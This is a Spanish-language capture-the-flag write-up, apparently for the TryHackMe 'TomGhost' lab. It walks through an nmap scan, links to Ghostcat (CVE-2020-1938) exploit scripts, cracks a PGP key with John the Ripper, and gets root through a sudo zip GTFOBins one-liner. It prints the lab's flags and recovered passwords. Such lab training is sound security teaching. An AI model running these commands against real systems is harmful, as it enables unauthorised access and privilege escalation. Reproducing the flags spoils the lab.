@@ -1,0 +1,90 @@
+TryHackMe - TomGhost
+
+Primero realizamos un escaneo de puertos con NMAP:
+
+nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn [IP-victima] -oN tomghost
+
+Respuesta:
+- 22 OpenSSH 7.2
+- 53 tcpwrapped
+- 8080 HTTP Tomcat 9.0.30
+
+Procedemos a buscar vulnerabilidades en las versiones disponibles:
+
+Vulnerabilidad en Tomcat:
+- Github: https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md
+
+El script anterior no funcionó, así que buscamos otro:
+- Github: https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py
+
+Resultado:
+
+Ingresamos al puerto 22 SSH con el usuario y contraseña proporcionados:
+
+ssh skyfuck@10.10.163.214
+
+Dentro del puerto SSH, encontramos la flag de usuario:
+
+User: THM{GhostCat_1s_so_cr4zy}
+
+Dentro de la sesión SSH, montamos un servidor Python3 en el puerto 5000 (el puerto 5000 no requiere privilegios) y obtenemos los archivos:
+
+- credential.pgp
+- tryhackme.asc
+
+Para poder abrir los archivos, necesitamos una contraseña. Ejecutamos un ataque de fuerza bruta al archivo "tryhackme.asc":
+
+gpg2john tryhackme.asc >> hash
+
+Luego, con John the Ripper, realizamos una fuerza bruta al archivo resultante (hash):
+
+john --wordlist=/usr/share/wordlist/rockyou.txt hash
+
+Resultado:
+
+alexandru (tryhackme)
+
+También se puede leer con John de la siguiente manera:
+
+john --show hash
+
+Respuesta:
+
+tryhackme:alexandru:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
+
+Con la contraseña "alexandru", regresamos a la sesión SSH e importamos las claves del archivo "tryhackme.asc" al archivo "credential.pgp" para poder desbloquear el archivo "credential.pgp":
+
+gpg --import tryhackme.asc
+
+Ahora, desciframos el archivo para obtener la clave válida:
+
+gpg --decrypt credential.pgp
+
+Resultado:
+
+merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+En la sesión SSH, encontramos un usuario llamado "merlin". Ingresamos con la contraseña encontrada:
+
+Como "merlin", ejecutamos el siguiente comando:
+
+sudo -l
+
+Este comando se utiliza en sistemas Unix y Unix-like (incluyendo Linux) para listar los privilegios de sudo (Superuser do) que tiene un usuario en ese sistema. La respuesta es "(root : root) NOPASSWD: /usr/bin/zip", lo que significa que el usuario tiene permisos de sudo específicos para ejecutar el comando "/usr/bin/zip" como el usuario root sin necesidad de ingresar una contraseña.
+
+Ahora, consultamos la página gtfobins para escalar privilegios:
+
+https://gtfobins.github.io/
+
+Para escalar privilegios, utilizamos el siguiente comando:
+
+TF=$(mktemp -u)
+sudo /usr/bin/zip $TF /etc/hosts -T -TT 'bash #'
+
+Ahora somos root. Leemos la carpeta root y encontramos "root.txt":
+
+cat root.txt
+
+Respuesta:
+
+THM{Z1P_1S_FAKE}
